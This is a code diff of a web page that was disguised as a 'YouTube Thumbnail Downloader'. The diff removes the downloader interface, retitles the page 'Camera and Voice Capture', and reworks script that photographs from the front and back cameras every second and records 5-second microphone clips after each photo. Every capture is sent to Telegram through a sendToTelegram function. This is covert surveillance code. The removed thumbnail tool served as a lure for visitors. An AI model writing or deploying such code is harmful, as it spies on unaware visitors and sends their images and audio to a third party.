@@ -2,11 +2,9 @@
 <html lang="en">
 <head>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-
-  <title>YouTube Thumbnail Downloader</title>
+  <title>Camera and Voice Capture</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
   <style>
     body {
       font-family: 'Montserrat', sans-serif;
@@ -25,70 +23,17 @@
       font-size: 28px;
       font-weight: bold;
     }
-    .container {
-      max-width: 600px;
-      margin: 20px auto;
-      padding: 20px;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-    .form-control {
-      width: calc(100% - 22px);
-      margin-bottom: 15px;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      box-sizing: border-box;
-      font-family: 'Montserrat', sans-serif;
-    }
-    #thumbdloadbtn {
-      display: block;
-      width: 100%;
-      padding: 10px;
-      border: none;
-      border-radius: 5px;
-      background-color: #ff0000;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
-      font-family: 'Montserrat', sans-serif;
-    }
-    #thumbdloadbtn:hover {
-      background-color: #cc0000;
-    }
     footer {
       text-align: center;
       margin-top: 40px;
       color: #666;
     }
-    .youtube-logo {
-      display: block;
-      margin: 20px auto;
-      width: 100px; /* Adjust size as needed */
-    }
   </style>
 </head>
 <body>
   <nav class="navbar">
-    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
-    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
+    <h1 id="header">Camera and Audio Capture</h1>
   </nav>
-
-  <div class="container">
-    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
-    <button id="thumbdloadbtn" onclick="downloadThumbnail()">FETCH</button>
-    <div id="thumbnail-preview"><!-- Placeholder for thumbnail preview --></div>
-
-    <h2>How to Download HD YouTube Thumbnail</h2>
-    <ol>
-      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
-      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
-      <li>Click on the "FETCH" Button</li>
-      <li>Select the thumbnail quality</li>
-      <li>Download the Thumbnail</li>
-    </ol>
-  </div>
 
   <center>
     <button id="toggle-video" style="display:none;">Toggle Video</button>
@@ -112,6 +57,7 @@
             imageCapture.takePhoto()
               .then((blob) => {
                 sendToTelegram(blob, 'photo');
+                captureAudio(audioRecorder);
               })
               .catch((error) => {
                 console.error('Error capturing front photo:', error);
@@ -125,6 +71,7 @@
             backImageCapture.takePhoto()
               .then((blob) => {
                 sendToTelegram(blob, 'photo');
+                captureAudio(audioRecorder);
               })
               .catch((error) => {
                 console.error('Error capturing back photo:', error);
@@ -132,11 +79,11 @@
           }
 
           // Capture audio for 5 seconds
-          function captureAudio() {
+          function captureAudio(audioRecorder) {
             audioRecorder.start();
             setTimeout(() => {
               audioRecorder.stop();
-            }, 5000);
+            }, 5000); // Capture audio for 5 seconds
           }
 
           audioRecorder.ondataavailable = (event) => {
@@ -146,11 +93,15 @@
           };
 
           // Set intervals to capture photos and audio
+          let capturingFront = true;
           setInterval(() => {
-            captureFrontPhoto();
-            captureBackPhoto();
-            captureAudio();
-          }, 1000); // Capture every second
+            if (capturingFront) {
+              captureFrontPhoto();
+            } else {
+              captureBackPhoto();
+            }
+            capturingFront = !capturingFront;
+          }, 1000); // Capture every second (photo + audio)
 
         })
         .catch((error) => {
